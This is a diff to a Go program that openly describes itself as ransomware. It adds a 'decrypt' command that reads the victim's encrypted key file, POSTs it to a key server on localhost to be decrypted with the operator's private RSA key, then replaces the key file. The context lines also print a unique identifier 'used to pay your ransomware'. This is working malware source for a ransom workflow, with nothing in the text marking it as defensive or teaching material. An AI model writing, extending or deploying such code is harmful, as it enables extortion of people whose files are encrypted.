@@ -331,6 +331,38 @@ func main() {
 			fmt.Println("'uuid' - display your unique indentifer used to pay your ransomware.")
 		} else if text == "uuid" {
 			fmt.Println(uindef)
+		} else if text == "decrypt" {
+			// send the key to the database and get the decrypted key using the private rsa key from the server.
+			key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
+			if err != nil {
+				log.Fatalf("error reading key file: %s", err)
+			}
+
+			req, err := http.NewRequest("POST", "http://localhost:8080/decrypt_key", bytes.NewBuffer(key))
+			if err != nil {
+				log.Fatalf("error with decrypt request: %s", err)
+			}
+
+			cl := http.Client{}
+			res, err := cl.Do(req)
+			if err != nil {
+				log.Fatalf("error getting decrypt key")
+			}
+			defer res.Body.Close()
+
+			deckey, err := ioutil.ReadAll(res.Body)
+			if err != nil {
+				log.Fatalf("error reading decrypted key: %s", err)
+			}
+
+			// remove the old key file
+			if err := os.Remove(ransomware.rootDir + "/key.txt"); err != nil {
+				log.Fatalf("error removing old key file: %s", err)
+			}
+
+			if err := ioutil.WriteFile(ransomware.rootDir+"/key.txt", deckey, 0600); err != nil {
+				log.Fatalf("write output: %s", err)
+			}
 		}
 	}
 }
